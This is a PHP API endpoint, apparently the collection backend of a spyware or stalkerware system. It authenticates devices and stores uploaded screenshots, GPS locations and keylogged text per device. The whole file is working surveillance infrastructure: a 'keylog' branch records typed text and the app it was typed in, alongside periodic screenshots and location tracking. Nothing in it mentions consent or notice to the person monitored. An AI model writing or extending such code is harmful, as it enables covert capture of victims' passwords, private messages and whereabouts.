<?php
/**
 * API Upload
 */

require_once '../../config/app.php';

$headers = getallheaders();
$api_key = $headers['X-API-Key'] ?? '';
if (!$api_key) sendError('API key requise', 401);

$device_id = $_GET['device_id'] ?? '';
$stmt = $pdo->prepare("
    SELECT u.*, d.id as device_db_id
    FROM users u
    JOIN devices d ON d.user_id = u.id
    WHERE u.api_key = ? AND d.device_id = ?
");
$stmt->execute([$api_key, $device_id]);
$result = $stmt->fetch();

if (!$result) sendError('Non autorisé', 403);

$deviceDbId = $result['device_db_id'];

// Mettre à jour le statut
$pdo->prepare("UPDATE devices SET last_seen = NOW(), is_online = 1 WHERE id = ?")
    ->execute([$deviceDbId]);

$type = $_GET['type'] ?? 'screenshot';

// ============================================
// SCREENSHOT
// ============================================
if ($type === 'screenshot' && isset($_FILES['image'])) {
    $uploadDir = UPLOAD_PATH . "screens/$deviceDbId/";
    if (!is_dir($uploadDir)) mkdir($uploadDir, 0755, true);
    
    $filename = time() . '.jpg';
    $filepath = $uploadDir . $filename;
    
    if (move_uploaded_file($_FILES['image']['tmp_name'], $filepath)) {
        $pdo->prepare("
            INSERT INTO screenshots (device_id, path, size, captured_at)
            VALUES (?, ?, ?, NOW())
        ")->execute([$deviceDbId, "screens/$deviceDbId/$filename", filesize($filepath)]);
        
        sendJson(['success' => true]);
    }
    exit;
}

// ============================================
// LOCATION
// ============================================
if ($type === 'location') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    $pdo->prepare("
        INSERT INTO locations (device_id, latitude, longitude, accuracy, timestamp)
        VALUES (?, ?, ?, ?, NOW())
    ")->execute([$deviceDbId, $data['lat'] ?? 0, $data['lng'] ?? 0, $data['accuracy'] ?? 0]);
    
    sendJson(['success' => true]);
    exit;
}

// ============================================
// KEYLOG
// ============================================
if ($type === 'keylog') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    $stmt = $pdo->prepare("
        INSERT INTO keylogs (device_id, app, text, timestamp)
        VALUES (?, ?, ?, NOW())
    ");
    
    foreach ($data['logs'] ?? [] as $log) {
        $stmt->execute([$deviceDbId, $log['app'] ?? '', $log['text'] ?? '']);
    }
    
    sendJson(['success' => true]);
    exit;
}

sendError('Type non supporté', 400);
?>
